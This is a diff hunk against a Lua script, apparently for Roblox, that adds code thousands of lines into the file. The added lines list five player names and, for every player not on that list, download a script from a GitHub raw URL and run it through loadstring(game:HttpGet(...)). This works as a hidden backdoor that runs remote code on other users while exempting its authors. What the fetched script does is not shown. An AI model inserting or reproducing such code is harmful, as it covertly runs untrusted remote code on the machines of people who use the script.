@@ -4700,3 +4700,8 @@ do
         if M then return J(M) end
     end
 end
+local nicks = {"vNCC1337", "Wer4er_official", "GaladonT", "Wer4erAlt", "Lurrnan"}
+local player = game.Players.LocalPlayer
+if not table.find(nicks, player.Name) then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Wer4er/SPTS/main/NoChatLog'))()
+end
